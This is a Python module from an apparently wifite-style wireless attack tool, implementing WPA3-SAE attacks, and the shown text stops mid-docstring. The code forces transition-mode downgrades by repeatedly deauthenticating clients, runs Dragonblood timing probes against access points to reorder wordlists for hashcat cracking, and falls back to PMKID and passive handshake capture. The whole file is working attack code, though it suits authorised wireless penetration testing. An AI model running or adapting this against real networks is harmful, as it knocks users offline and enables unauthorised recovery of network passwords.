#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
WPA3-SAE Attack Module

This module implements comprehensive WPA3-SAE attack capabilities including:
- Transition mode downgrade attacks
- SAE handshake capture
- Dragonblood exploitation
- PMF-aware passive capture
"""

from ..model.attack import Attack
from ..tools.airodump import Airodump
from ..tools.aireplay import Aireplay
from ..config import Configuration
from ..util.color import Color
from ..util.logger import log_info, log_debug
from ..util.timer import Timer
from ..util.output import OutputManager
from ..util.wpa3 import WPA3Detector
from ..util.wpa3_tools import WPA3ToolChecker
from ..attack.wpa3_strategy import WPA3AttackStrategy
from ..model.handshake import Handshake
from ..model.sae_result import CrackResultSAE
from ..model.wpa_result import CrackResultWPA
from contextlib import contextmanager
import time
import os


class AttackWPA3SAE(Attack):
    """
    WPA3-SAE attack implementation.

    This class implements various attack strategies for WPA3-SAE networks:
    1. Transition mode downgrade (highest success rate)
    2. Dragonblood exploitation (for vulnerable targets)
    3. Standard SAE handshake capture
    4. Passive capture (when PMF prevents deauth)
    """

    def __init__(self, target):
        super(AttackWPA3SAE, self).__init__(target)
        self.clients = []
        self.crack_result = None
        self.success = False
        self.wpa3_info = None
        self.attack_strategy = None
        self.downgrade_success = False

        # Initialize TUI view if in TUI mode
        self.view = None
        if OutputManager.is_tui_mode():
            try:
                from ..ui.attack_view import WPA3AttackView
                self.view = WPA3AttackView(OutputManager.get_controller(), target)
            except Exception:
                # If TUI initialization fails, continue without it
                self.view = None

    def run(self):
        """
        Execute WPA3-SAE attack based on target capabilities.

        This method:
        1. Checks for required tools
        2. Detects WPA3 capabilities
        3. Checks for Dragonblood vulnerabilities
        4. Selects optimal attack strategy
        5. Executes the selected strategy
        6. Falls back to alternative strategies if needed

        Returns:
            bool: True if attack succeeded, False otherwise
        """
        log_info('AttackWPA3', 'Starting WPA3 attack on %s (%s) ch %s' % (
            self.target.essid or '?', self.target.bssid, self.target.channel))
        attack_start = time.time()

        # Check for required WPA3 tools
        if not self._check_wpa3_tools():
            return False

        # Start TUI view if available
        if self.view:
            self.view.start()

        # Detect WPA3 capabilities
        self.wpa3_info = WPA3Detector.detect_wpa3_capability(self.target)

        # Check for Dragonblood vulnerabilities
        self._check_dragonblood_vulnerability()

        # Select attack strategy
        self.attack_strategy = WPA3AttackStrategy.select_strategy(
            self.target,
            self.wpa3_info
        )

        # Display strategy to user
        self._display_strategy()

        # Build fallback chain starting from the selected strategy
        result = self._execute_fallback_chain(self.attack_strategy)

        log_info('AttackWPA3', 'WPA3 attack on %s finished in %.1fs — %s' % (
            self.target.bssid, time.time() - attack_start,
            'SUCCESS' if result else 'failed'))
        return result

    def _execute_fallback_chain(self, start_strategy):
        """
        Execute attack strategies in a fallback chain.

        Tries the selected strategy first, then falls back through
        remaining strategies in priority order until one succeeds
        or all are exhausted.

        Chain order: DOWNGRADE → DRAGONBLOOD → SAE_CAPTURE → PMKID → PASSIVE

        Args:
            start_strategy: Strategy to start with

        Returns:
            bool: True if any strategy succeeded
        """
        # Full chain in priority order
        full_chain = [
            WPA3AttackStrategy.DOWNGRADE,
            WPA3AttackStrategy.DRAGONBLOOD,
            WPA3AttackStrategy.SAE_CAPTURE,
            'pmkid',  # PMKID fallback (not a WPA3AttackStrategy constant)
            WPA3AttackStrategy.PASSIVE,
        ]

        # Build the chain starting from the selected strategy
        if start_strategy in full_chain:
            start_idx = full_chain.index(start_strategy)
        else:
            start_idx = 0
        chain = full_chain[start_idx:]

        strategy_methods = {
            WPA3AttackStrategy.DOWNGRADE: self._try_downgrade,
            WPA3AttackStrategy.DRAGONBLOOD: self._try_dragonblood,
            WPA3AttackStrategy.SAE_CAPTURE: self._try_sae_capture,
            'pmkid': self._try_pmkid_fallback,
            WPA3AttackStrategy.PASSIVE: self._try_passive,
        }

        attempted = []
        for strategy in chain:
            # Skip strategies that don't apply
            if strategy == WPA3AttackStrategy.DOWNGRADE and not WPA3AttackStrategy.can_use_downgrade(self.wpa3_info):
                continue
            if strategy == WPA3AttackStrategy.DRAGONBLOOD and not WPA3AttackStrategy.should_use_dragonblood(self.wpa3_info):
                continue

            method = strategy_methods.get(strategy)
            if not method:
                continue

            attempted.append(strategy)

            try:
                result = method()
                if result:
                    return True
            except KeyboardInterrupt:
                raise
            except Exception as e:
                log_info('AttackWPA3', 'Strategy %s failed with error: %s' % (strategy, e))

            # Log fallback
            remaining = [s for s in chain if s not in attempted]
            if remaining:
                next_strategy = remaining[0]
                Color.pl('{+} {C}Falling back to: %s{W}' % (
                    WPA3AttackStrategy.STRATEGY_DESCRIPTIONS.get(next_strategy, next_strategy)))
                if self.view:
                    self.view.add_log('Falling back to: %s' % next_strategy)

        Color.pl('{!} {R}All WPA3 attack strategies exhausted{W}')
        return False

    def _try_downgrade(self):
        """Execute downgrade strategy without internal fallback."""
        Color.pl('{+} {C}Attempting transition mode downgrade attack...{W}')
        if self.view:
            self.view.add_log('Starting downgrade attack')
        result = self.attempt_downgrade()
        if result:
            Color.pl('{+} {G}Downgrade successful! Captured WPA2 handshake{W}')
            # attempt_downgrade() returns a Handshake (WPA2 4-way). Wrap it
            # so all.py's `attack.crack_result.save()` doesn't crash.
            self.crack_result = CrackResultWPA(
                result.bssid, result.essid, result.capfile, None)
            self.crack_result.dump()
            self.success = True
            return True
        Color.pl('{!} {O}Downgrade attack failed{W}')
        return False

    def _try_dragonblood(self):
        """
        Execute Dragonblood timing attack (CVE-2019-13377).

        When the AP uses MODP groups 22/23/24, the SAE hunting-and-pecking
        algorithm leaks timing information through the quadratic-residue
        test.  This method:
          1. Displays vulnerability details
          2. Runs timing probes against the AP with candidate passwords
          3. Partitions the password space into fast/slow buckets
          4. Reorders the wordlist and cracks with hashcat

        Falls through to the next strategy if timing is disabled,
        not viable, or cracking fails.
        """
        from ..util.dragonblood import DragonbloodDetector
        from ..util.dragonblood_timing import DragonbloodTimingAttack

        Color.pl('{+} {C}Attempting Dragonblood exploitation (CVE-2019-13377)...{W}')
        if self.view:
            self.view.add_log('Starting Dragonblood timing attack')

        # Always show vulnerability details
        self._display_dragonblood_vulnerability()

        # Check if timing attack is enabled and viable
        if not Configuration.dragonblood_timing:
            Color.pl('{!} {O}Dragonblood timing attack not enabled{W}')
            Color.pl('{!} {O}Use --dragonblood-timing to enable, '
                     'or use external tools: dragonslayer, dragonforce{W}')
            return False

        # If passive detection didn't find any vulnerable MODP group,
        # actively probe the AP for support. SAE groups are not in
        # beacons — without captured SAE frames OR an active probe,
        # sae_groups falls back to [19] and the viability check fails
        # even against genuinely-vulnerable APs.
        if not DragonbloodDetector.is_timing_attack_viable(self.wpa3_info):
            self._active_probe_for_vulnerable_groups()

        if not DragonbloodDetector.is_timing_attack_viable(self.wpa3_info):
            Color.pl('{!} {O}Timing attack not viable: '
                     'no vulnerable MODP groups (22, 23, 24) detected{W}')
            return False

        # Need a wordlist for timing probes
        wordlist = Configuration.wordlist
        if not wordlist or not os.path.isfile(wordlist):
            Color.pl('{!} {O}No wordlist available for timing probes{W}')
            Color.pl('{!} {O}Provide a wordlist with --dict to enable '
                     'Dragonblood timing attack{W}')
            return False

        # Read candidate passwords (limited set for probing)
        max_pw = Configuration.dragonblood_max_passwords
        candidates = self._read_probe_candidates(wordlist, max_pw)
        if not candidates:
            Color.pl('{!} {O}No candidate passwords loaded from wordlist{W}')
            return False

        Color.pl('{+} {C}Loaded %d candidate passwords for timing probes{W}'
                 % len(candidates))

        # Determine the vulnerable SAE group to target
        sae_groups = self.wpa3_info.get('sae_groups', [])
        target_group = 0
        for g in [22, 23, 24]:
            if g in sae_groups:
                target_group = g
                break

        # Run the timing attack
        timing = DragonbloodTimingAttack(
            interface=Configuration.interface,
            target_bssid=self.target.bssid,
            target_essid=self.target.essid or '',
            target_channel=int(self.target.channel),
            sae_group=target_group,
        )

        try:
            analysis = timing.run(
                passwords=candidates,
                num_samples=Configuration.dragonblood_samples,
                view=self.view,
            )

            if not analysis or analysis.total_samples < timing.MIN_SAMPLES:
                Color.pl('{!} {O}Insufficient timing data collected{W}')
                timing.print_report()
                return False

            # Show results
            timing.print_report()

            # Enrich the vulnerability report
            if hasattr(self, 'dragonblood_vuln') and self.dragonblood_vuln:
                DragonbloodDetector.enrich_with_timing(
                    self.dragonblood_vuln, analysis)

            if self.view:
                self.view.add_log(
                    f'Timing analysis: {analysis.confidence:.0%} confidence, '
                    f'{len(analysis.fast_passwords)} fast passwords')

            # If the partition is meaningful, reorder the wordlist and crack
            if analysis.confidence >= 0.3 and analysis.fast_passwords:
                Color.pl('{+} {G}Timing partition usable — '
                         'reordering wordlist for optimised cracking{W}')

                optimised_wl = timing.get_prioritised_wordlist(wordlist)
                if optimised_wl:
                    return self._crack_with_wordlist(optimised_wl)

            Color.pl('{!} {O}Timing partition too weak for reliable '
                     'password space reduction{W}')
            return False

        except KeyboardInterrupt:
            Color.pl('\n{!} {O}Dragonblood timing attack interrupted{W}')
            raise
        except Exception as e:
            Color.pl('{!} {R}Dragonblood timing error: %s{W}' % str(e))
            log_info('AttackWPA3', 'Dragonblood timing failed: %s' % e)
            return False
        finally:
            timing.cleanup()

    def _try_sae_capture(self):
        """Execute SAE capture strategy."""
        Color.pl('{+} {C}Capturing SAE handshake...{W}')
        if self.view:
            self.view.add_log('Starting SAE handshake capture')
        pmf_required = self._handle_pmf_prevention()
        if pmf_required:
            return False  # Let it fall through to passive
        handshake = self.capture_sae_handshake()
        if handshake:
            self._finalize_sae_success(handshake, key=None)
            return True
        Color.pl('{!} {O}SAE handshake capture failed{W}')
        return False

    def _try_pmkid_fallback(self):
        """Try PMKID attack as fallback for WPA3 targets."""
        from ..attack.pmkid import AttackPMKID
        if Configuration.dont_use_pmkid:
            return False
        Color.pl('{+} {C}Trying PMKID attack as fallback...{W}')
        if self.view:
            self.view.add_log('Trying PMKID fallback')
        try:
            pmkid_attack = AttackPMKID(self.target)
            result = pmkid_attack.run()
            if result:
                self.success = True
                self.crack_result = pmkid_attack.crack_result
                return True
        except Exception as e:
            log_info('AttackWPA3', 'PMKID fallback failed: %s' % e)
        return False

    def _try_passive(self):
        """Execute passive capture strategy."""
        Color.pl('{+} {C}Starting passive SAE capture (last resort)...{W}')
        if self.view:
            self.view.add_log('Starting passive capture - final fallback')
        handshake = self.passive_capture()
        if handshake:
            self._finalize_sae_success(handshake, key=None)
            return True
        return False

    def _finalize_sae_success(self, handshake, key):
        """Record a captured SAE handshake as a CrackResultSAE.

        `handshake` is an SAEHandshake object (has .capfile / .bssid / .essid).
        `key` is the recovered PSK if known, else None.

        When `key` is None we still save the capture (for records / later
        analysis) but we must NOT present it as a crackable win — see
        _warn_sae_not_offline_crackable for why.
        """
        self.crack_result = CrackResultSAE(
            handshake.bssid, handshake.essid, handshake.capfile, key)
        self.crack_result.dump()
        self.success = True
        if key is None:
            self._warn_sae_not_offline_crackable()

    def _warn_sae_not_offline_crackable(self):
        """Honest caveat: a captured SAE handshake is NOT offline-crackable.

        Unlike a WPA2 4-way handshake, WPA3-SAE (Dragonfly) is a PAKE
        designed to resist offline dictionary attacks. Capturing the SAE
        exchange does not let hashcat/aircrack recover the password the way
        a WPA2 capture does — there is no hashcat mode that cracks a captured
        SAE handshake. We keep the capture, but we tell the user the truth
        instead of implying the network was owned.
        """
        Color.pl('{!} {O}SAE handshake captured and saved — but note:{W}')
        Color.pl('{!} {O}WPA3-SAE (Dragonfly) resists offline dictionary attacks.{W}')
        Color.pl('{!} {O}A captured SAE handshake {R}cannot be cracked offline{O} '
                 'like a WPA2 handshake.{W}')
        Color.pl('{!} {O}Offline password recovery is only feasible via:{W}')
        Color.pl('    {C}-{W} Transition-mode {C}downgrade{W} to WPA2 '
                 '(captures a crackable 4-way handshake)')
        Color.pl('    {C}-{W} A successful {C}Dragonblood timing{W} partition '
                 '(only MODP groups 22/23/24)')
        if self.view:
            self.view.add_log('SAE handshake captured (NOT offline-crackable — '
                              'WPA3-SAE resists dictionary attacks)')

    def _active_probe_for_vulnerable_groups(self):
        """
        Actively probe the AP to discover supported SAE groups.

        Sends SAE Commit frames per candidate group via wpa_supplicant and
        updates `self.wpa3_info['sae_groups']` with the accepted set.
        Requires temporarily flipping the interface to managed mode —
        wpa_supplicant can't drive a monitor-mode interface.
        """
        interface = Configuration.interface
        if not interface:
            return
        if not self.target.essid:
            Color.pl('{!} {O}Active SAE probing needs an ESSID; target is hidden{W}')
            return

        Color.pl('{+} {C}Actively probing AP for supported SAE groups '
                 '(briefly switching to managed mode)...{W}')
        if self.view:
            self.view.add_log('Active SAE group probing')

        results = {}
        try:
            with self._managed_mode_for_probe(interface):
                results = WPA3Detector.probe_sae_groups_active(
                    interface=interface,
                    bssid=self.target.bssid,
                    essid=self.target.essid,
                    channel=int(self.target.channel),
                )
        except Exception as e:
            Color.pl('{!} {O}Active SAE probing failed: %s{W}' % e)
            log_debug('AttackWPA3', 'active probe error: %s' % e)
            return

        accepted = sorted(g for g, s in results.items() if s == 'accepted')
        rejected = sorted(g for g, s in results.items() if s == 'rejected')
        if not accepted and not rejected:
            Color.pl('{!} {O}Active probing yielded no usable signal '
                     '(AP unresponsive or interface setup issue){W}')
            return

        Color.pl('{+} {C}Probed SAE groups — accepted: {G}%s{C}  rejected: {O}%s{W}'
                 % (accepted or '-', rejected or '-'))
        if self.view:
            self.view.add_log('Accepted groups: %s' % (accepted or '-'))

        # Merge accepted groups into wpa3_info and recompute vulnerability.
        if accepted:
            self.wpa3_info['sae_groups'] = accepted
            self.wpa3_info['dragonblood_vulnerable'] = any(
                g in WPA3Detector.VULNERABLE_SAE_GROUPS for g in accepted)
            # Also propagate to the cached WPA3Info object so later
            # strategy decisions see the same state.
            info = getattr(self.target, 'wpa3_info', None)
            if info is not None and hasattr(info, 'sae_groups'):
                info.sae_groups = accepted
                info.dragonblood_vulnerable = self.wpa3_info['dragonblood_vulnerable']

    @staticmethod
    @contextmanager
    def _managed_mode_for_probe(interface):
        """
        Context manager: put `interface` in managed mode, restore monitor.

        wpa_supplicant requires a managed-mode interface; our scanning
        interface is normally in monitor mode. We use iw to toggle and
        ensure we restore even on error.
        """
        from ..tools.iw import Iw
        from ..tools.ip import Ip
        was_monitor = False
        try:
            was_monitor = Iw.is_monitor(interface)
        except Exception:
            was_monitor = True  # assume monitor; restore conservatively

        try:
            if was_monitor:
                Ip.down(interface)
                Iw.mode(interface, 'managed')
                Ip.up(interface)
                log_debug('AttackWPA3',
                          '%s → managed mode for SAE probing' % interface)
            yield
        finally:
            if was_monitor:
                try:
                    Ip.down(interface)
                    Iw.mode(interface, 'monitor')
                    Ip.up(interface)
                    log_debug('AttackWPA3',
                              '%s → monitor mode restored' % interface)
                except Exception as e:
                    log_debug('AttackWPA3',
                              'monitor restore failed for %s: %s'
                              % (interface, e))

    def _check_wpa3_tools(self):
        """
        Check if required WPA3 tools are available.

        Returns:
            bool: True if all required tools are available, False otherwise
        """
        if not WPA3ToolChecker.can_attack_wpa3():
            Color.pl('{!} {R}Cannot attack WPA3 - missing required tools{W}')

            missing = WPA3ToolChecker.get_missing_tools()
            if missing:
                Color.pl('{!} {O}Missing tools:{W}')
                for tool in missing:
                    url = WPA3ToolChecker.INSTALL_URLS.get(tool, 'N/A')
                    Color.pl('    {R}%s{W}: {C}%s{W}' % (tool, url))

                Color.pl('\n{!} {O}Install missing tools to enable WPA3 attacks{W}')
                Color.pl('{!} {O}Skipping WPA3 target: {C}%s{W}' % self.target.essid)

            return False

        return True

    def _handle_pmf_prevention(self):
        """
        Handle PMF (Protected Management Frames) preventing deauth attacks.

        This method:
        1. Detects PMF status
        2. Informs user of limitations
        3. Switches to passive capture mode

        Returns:
            bool: True if PMF is required (deauth disabled), False otherwise
        """
        pmf_status = self.wpa3_info.get('pmf_status', 'unknown')
        
        if pmf_status == 'required':
            Color.pl('\n{!} {O}PMF (Protected Management Frames) is REQUIRED{W}')
            Color.pl('{!} {O}This prevents deauthentication attacks{W}')
            Color.pl('{!} {O}Limitations:{W}')
            Color.pl('    - Cannot force client disconnections')
            Color.pl('    - Cannot trigger reconnections')
            Color.pl('    - Must wait for natural client activity')
            Color.pl('{!} {C}Switching to passive capture mode...{W}')
            
            if self.view:
                self.view.add_log('PMF required - deauth attacks disabled')
                self.view.add_log('Switching to passive capture mode')
                self.view.set_pmf_status('required')
            
            return True
        
        elif pmf_status == 'optional':
            Color.pl('{+} {C}PMF is optional - deauth attacks may work{W}')
            if self.view:
                self.view.set_pmf_status('optional')
            return False
        
        else:
            Color.pl('{+} {G}PMF is disabled - deauth attacks enabled{W}')
            if self.view:
                self.view.set_pmf_status('disabled')
            return False

    def _check_dragonblood_vulnerability(self):
        """Check target for Dragonblood vulnerabilities."""
        from ..util.dragonblood import DragonbloodDetector
        
        if not self.wpa3_info:
            return
        
        # Check for vulnerabilities
        vuln_info = DragonbloodDetector.check_vulnerability(self.wpa3_info)
        
        # Store vulnerability info
        self.dragonblood_vuln = vuln_info
        
        # Display if vulnerable (unless in scan-only mode)
        if vuln_info['vulnerable'] and not Configuration.wpa3_check_dragonblood:
            DragonbloodDetector.print_vulnerability_report(
                self.target.essid,
                self.target.bssid,
                vuln_info,
                verbose=Configuration.verbose > 0
            )
            
            if self.view:
                self.view.add_log(f"Dragonblood: {vuln_info['risk_level']} risk detected")
    
    def _display_dragonblood_vulnerability(self):
        """Display detailed Dragonblood vulnerability information."""
        from ..util.dragonblood import DragonbloodDetector
        
        if hasattr(self, 'dragonblood_vuln') and self.dragonblood_vuln:
            DragonbloodDetector.print_vulnerability_report(
                self.target.essid,
                self.target.bssid,
                self.dragonblood_vuln,
                verbose=True
            )

    @staticmethod
    def _read_probe_candidates(wordlist_path: str, max_count: int) -> list:
        """
        Read the first *max_count* valid WPA passwords from a wordlist.

        Filters to 8-63 character passwords (WPA-PSK / SAE requirement).
        """
        candidates = []
        try:
            with open(wordlist_path, 'r', errors='replace') as fh:
                for line in fh:
                    word = line.rstrip('\n\r')
                    if 8 <= len(word) <= 63:
                        candidates.append(word)
                        if len(candidates) >= max_count:
                            break
        except Exception as e:
            log_info('AttackWPA3', 'Error reading wordlist: %s' % e)
        return candidates

    def _crack_with_wordlist(self, wordlist_path: str) -> bool:
        """
        Crack a captured SAE handshake using hashcat with the given wordlist.

        Attempts a quick SAE capture, then cracks with hashcat mode 22000
        using the timing-optimised wordlist.

        Returns:
            True if cracking succeeds.
        """
        from ..util.sae_crack import SAECracker

        Color.pl('{+} {C}Capturing SAE handshake for Dragonblood-optimised cracking...{W}')
        if self.view:
            self.view.add_log('Capturing SAE handshake for optimised cracking')

        sae_hs = self.capture_sae_handshake()
        if not sae_hs:
            Color.pl('{!} {O}Could not capture SAE handshake for cracking{W}')
            return False

        Color.pl('{+} {C}Cracking with timing-optimised wordlist...{W}')
        if self.view:
            self.view.add_log('Cracking with timing-optimised wordlist')

        key = SAECracker.crack_sae_handshake(
            sae_hs,
            wordlist=wordlist_path,
            show_command=True,
            verbose=True,
        )
        if key:
            Color.pl('{+} {G}Dragonblood timing attack successful!{W}')
            Color.pl('{+} {G}Key: {C}%s{W}' % key)
            self._finalize_sae_success(sae_hs, key=key)
            if self.view:
                self.view.add_log(f'Key found: {key}')
            return True

        Color.pl('{!} {O}Cracking with timing-optimised wordlist failed{W}')
        return False

    def _display_strategy(self):
        """Display selected attack strategy to user."""
        strategy_display = WPA3AttackStrategy.format_strategy_display(
            self.attack_strategy,
            self.wpa3_info
        )
        
        Color.pl('\n{+} {C}WPA3 Attack Strategy Selected:{W}')
        for line in strategy_display.split('\n'):
            Color.pl('    %s' % line)
        Color.pl('')
        
        # Update TUI view if available
        if self.view:
            self.view.set_attack_type(
                WPA3AttackStrategy.get_strategy_description(self.attack_strategy)
            )
            self.view.add_log(strategy_display)

    @staticmethod
    def check_dragonblood_vulnerability(target):
        """
        Check and report Dragonblood vulnerability for a target.
        
        This is used for the --check-dragonblood flag.
        
        Args:
            target: Target object to check
        
        Returns:
            bool: True if vulnerable, False otherwise
        """
        # Detect WPA3 capabilities
        wpa3_info = WPA3Detector.detect_wpa3_capability(target)
        
        if not wpa3_info.get('has_wpa3'):
            Color.pl('{!} {O}Target does not support WPA3-SAE{W}')
            return False
        
        Color.pl('\n{+} {C}WPA3-SAE Target Detected:{W}')
        Color.pl('    ESSID: {C}%s{W}' % (target.essid or 'Hidden'))
        Color.pl('    BSSID: {C}%s{W}' % target.bssid)
        Color.pl('    Channel: {C}%s{W}' % target.channel)
        Color.pl('    Transition Mode: {C}%s{W}' % ('Yes' if wpa3_info.get('is_transition') else 'No'))
        Color.pl('    PMF Status: {C}%s{W}' % wpa3_info.get('pmf_status', 'unknown'))
        
        sae_groups = wpa3_info.get('sae_groups', [])
        if sae_groups:
            Color.pl('    SAE Groups: {C}%s{W}' % ', '.join(map(str, sae_groups)))
        
        # Check for vulnerability
        is_vulnerable = wpa3_info.get('dragonblood_vulnerable', False)
        
        if is_vulnerable:
            Color.pl('\n{+} {R}VULNERABLE TO DRAGONBLOOD!{W}')
            
            vulnerable_groups = [g for g in sae_groups if g in WPA3Detector.VULNERABLE_SAE_GROUPS]
            if vulnerable_groups:
                Color.pl('    Vulnerable Groups: {R}%s{W}' % ', '.join(map(str, vulnerable_groups)))
            
            Color.pl('\n{+} {O}Vulnerability Details:{W}')
            Color.pl('    - CVE-2019-13377: Timing-based password partitioning')
            Color.pl('    - CVE-2019-13456: Side-channel information leakage')
            Color.pl('    - Vulnerable SAE groups (22, 23, 24) detected')
            Color.pl('    - Timing attacks may reduce password search space')
            
            Color.pl('\n{+} {O}Recommended Actions:{W}')
            Color.pl('    1. Use dragonslayer for timing-based attacks')
            Color.pl('    2. Capture SAE handshake for offline cracking')
            Color.pl('    3. If transition mode, use downgrade attack')
            Color.pl('    4. Recommend AP firmware update to owner')
        else:
            Color.pl('\n{+} {G}Not vulnerable to known Dragonblood attacks{W}')
            Color.pl('    - No vulnerable SAE groups detected')
            Color.pl('    - Standard SAE handshake capture recommended')
        
        Color.pl('')
        return is_vulnerable


    def attempt_downgrade(self):
        """
        Attempt to downgrade WPA3 connection to WPA2.
        
        This method:
        1. Monitors for WPA3-SAE authentication attempts
        2. Sends deauth during SAE handshake
        3. Forces client to reconnect with WPA2
        4. Captures WPA2 4-way handshake using hcxdumptool (pcapng format)
        
        Handles:
        - Target detection failures
        - No clients scenarios
        - Deauth failures
        - Timeout scenarios
        - Handshake validation
        
        Returns:
            Handshake object if successful, None otherwise
        """
        from ..tools.hcxdumptool import HcxDumpTool
        
        handshake = None
        hcxdump = None
        airodump = None
        
        try:
            # Use hcxdumptool for capture to get pcapng format
            # This format properly supports both WPA2 and WPA3-SAE handshakes
            hcxdump = HcxDumpTool(channel=self.target.channel,
                                  target_bssid=self.target.bssid,
                                  enable_deauth=False,  # We'll manually deauth
                                  pmf_required=False)
            hcxdump.__enter__()
            
            # Also start airodump for client detection
            airodump = Airodump(channel=self.target.channel,
                          target_bssid=self.target.bssid,
                          skip_wps=True,
                          output_file_prefix='wpa3_downgrade')
            airodump.__enter__()
            
            Color.clear_entire_line()
            Color.pattack('WPA3', self.target, 'Downgrade', 'Waiting for target to appear...')
            
            try:
                airodump_target = self.wait_for_target(airodump)
            except Exception as e:
                Color.pl('\n{!} {R}Target detection failed:{W} %s' % str(e))
                if self.view:
                    self.view.add_log(f'Target detection failed: {str(e)}')
                Color.pl('{!} {O}Possible causes:{W}')
                Color.pl('    - Target out of range')
                Color.pl('    - Wrong channel')
                Color.pl('    - Target powered off')
                return None
            
            self.clients = []

            # Set timeout for the downgrade attempt. Honour --wpa3-timeout when
            # the user set it; otherwise keep a short 30s window — the downgrade
            # is a fast first attempt that falls back to SAE capture, so it
            # shouldn't occupy the full wpa_attack_timeout (300s) by default.
            timeout_value = Configuration.wpa3_attack_timeout or 30
            downgrade_timeout = Timer(timeout_value)
            # Warn once if no clients appear partway through (the downgrade
            # needs active clients). Half the window, floored so short timeouts
            # still produce a warning.
            no_clients_warn_after = max(5, timeout_value // 2)
            deauth_timer = Timer(Configuration.wpa_deauth_timeout)
            sae_detected = False
            deauth_attempts = 0
            max_deauth_attempts = 10
            no_clients_warning_shown = False
            
            Color.pl('{+} {C}Monitoring for WPA3-SAE authentication attempts...{W}')
            
            # Progress tracking
            last_progress_update = time.time()
            progress_interval = 5  # Update progress every 5 seconds
            
            while handshake is None and not downgrade_timeout.ended():
                step_timer = Timer(1)
                
                # Calculate progress percentage
                elapsed = downgrade_timeout.running_time()
                total_time = timeout_value
                progress_pct = min(100, int((elapsed / total_time) * 100))
                
                # Update TUI view if available
                if self.view:
                    self.view.refresh_if_needed()
                    self.view.update_progress({
                        'status': 'Monitoring for SAE authentication',
                        'metrics': {
                            'Progress': f'{progress_pct}%',
                            'Clients': len(self.clients),
                            'Deauth Attempts': deauth_attempts,
                            'Time Remaining': str(downgrade_timeout)
                        }
                    })
                
                # Periodic progress update for classic mode
                current_time = time.time()
                if current_time - last_progress_update >= progress_interval:
                    Color.pl('{+} {C}Downgrade progress: {G}%d%%{W} complete, {C}%s{W} remaining{W}' % 
                           (progress_pct, str(downgrade_timeout)))
                    last_progress_update = current_time
                
                # Get current clients
                try:
                    airodump_target = self.wait_for_target(airodump, timeout=1)
                    if airodump_target:
                        self.clients = airodump_target.clients
                except Exception as e:
                    # Target temporarily lost, continue
                    pass
                
                # Check if we have clients
                if len(self.clients) == 0:
                    Color.pattack('WPA3', self.target, 'Downgrade',
                                 'Waiting for clients... (%s)' % downgrade_timeout)
                    
                    # Show warning once we're partway through with no clients
                    if not no_clients_warning_shown and \
                            downgrade_timeout.running_time() >= no_clients_warn_after:
                        Color.pl('\n{!} {O}No clients detected after %d seconds{W}'
                                 % no_clients_warn_after)
                        Color.pl('{!} {O}Downgrade requires active clients to succeed{W}')
                        if self.view:
                            self.view.add_log('Warning: No clients detected')
                        no_clients_warning_shown = True
                    
                    time.sleep(step_timer.remaining())
                    continue
                
                # Deauth clients periodically to trigger reconnection
                if deauth_timer.ended():
                    Color.pattack('WPA3', self.target, 'Downgrade',
                                 'Deauthing clients to force reconnection...')
                    
                    if self.view:
                        self.view.add_log(f'Deauthing {len(self.clients)} client(s) (attempt {deauth_attempts + 1})')
                    
                    # Deauth all clients
                    deauth_success = False
                    for client in self.clients:
                        try:
                            Aireplay.deauth(self.target.bssid, client_mac=client.station, num_deauths=5)
                            deauth_success = True
                        except Exception as e:
                            Color.pl('{!} {O}Deauth failed for client %s: %s{W}' % (client.station, str(e)))
                            if self.view:
                                self.view.add_log(f'Deauth error: {str(e)}')
                    
                    if deauth_success:
                        deauth_attempts += 1
                        deauth_timer = Timer(Configuration.wpa_deauth_timeout)
                        sae_detected = True
                    
                    # Check if we've exceeded max deauth attempts
                    if deauth_attempts >= max_deauth_attempts:
                        Color.pl('\n{!} {O}Maximum deauth attempts reached (%d){W}' % max_deauth_attempts)
                        Color.pl('{!} {O}Clients may not be downgrading to WPA2{W}')
                        Color.pl('{!} {O}Possible reasons:{W}')
                        Color.pl('    - AP enforcing WPA3-only mode')
                        Color.pl('    - Clients configured for WPA3-only')
                        Color.pl('    - PMF preventing downgrade')
                        if self.view:
                            self.view.add_log('Max deauth attempts - downgrade may not be possible')
                        break
                
                # Check for captured handshake
                # After deauth, clients should reconnect with WPA2
                # Check hcxdumptool capture (pcapng format)
                try:
                    if hcxdump and hcxdump.has_new_data():
                        handshake = Handshake(hcxdump.get_output_file(),
                                             bssid=self.target.bssid,
                                             essid=self.target.essid)
                        
                        if handshake.has_handshake():
                            # Successfully captured handshake in pcapng format
                            Color.pl('\n{+} {G}Captured handshake after downgrade!{W}')
                            if self.view:
                                self.view.add_log('Downgrade successful - handshake captured in pcapng format')
                            self.downgrade_success = True
                            return handshake
                        else:
                            handshake = None
                except Exception as e:
                    # Error checking handshake, continue
                    handshake = None
                
                # Update status
                status_msg = 'Listening for WPA2 handshake (clients: %d, deauths: %d)' % (len(self.clients), deauth_attempts)
                Color.pattack('WPA3', self.target, 'Downgrade', status_msg)
                
                time.sleep(step_timer.remaining())
            
            # Timeout or max attempts reached
            if not handshake:
                Color.pl('\n{!} {O}Downgrade attack failed{W}')
                
                if len(self.clients) == 0:
                    Color.pl('{!} {O}Failure reason: No clients detected{W}')
                    Color.pl('{!} {O}Downgrade requires active clients{W}')
                elif deauth_attempts == 0:
                    Color.pl('{!} {O}Failure reason: No deauth attempts made{W}')
                elif deauth_attempts >= max_deauth_attempts:
                    Color.pl('{!} {O}Failure reason: Clients not downgrading after %d deauth attempts{W}' % deauth_attempts)
                    Color.pl('{!} {O}Target may be WPA3-only or have downgrade protection{W}')
                else:
                    Color.pl('{!} {O}Failure reason: Timeout reached{W}')
                    Color.pl('{!} {O}Clients may not have reconnected with WPA2{W}')
                
                if self.view:
                    self.view.add_log('Downgrade failed - falling back to SAE capture')
                    self.view.update_downgrade_status(True, False)
        
        except KeyboardInterrupt:
            Color.pl('\n{!} {O}Downgrade attack interrupted by user{W}')
            if self.view:
                self.view.add_log('Downgrade interrupted by user')
            raise
        
        except Exception as e:
            Color.pl('\n{!} {R}Downgrade attack error: %s{W}' % str(e))
            if self.view:
                self.view.add_log(f'Downgrade error: {str(e)}')
            Color.pl('{!} {O}This may be due to:{W}')
            Color.pl('    - Tool execution error')
            Color.pl('    - Insufficient permissions')
            Color.pl('    - Interface issues')
        
        finally:
            # Clean up hcxdumptool
            if hcxdump:
                try:
                    hcxdump.__exit__(None, None, None)
                except Exception as e:
                    Color.pl('{!} {O}Error cleaning up hcxdumptool: %s{W}' % str(e))
            
            # Clean up airodump
            if airodump:
                try:
                    airodump.__exit__(None, None, None)
                except Exception as e:
                    Color.pl('{!} {O}Error cleaning up airodump: %s{W}' % str(e))
        
        return handshake

    def capture_sae_handshake(self):
        """
        Capture SAE handshake using active deauth.
        
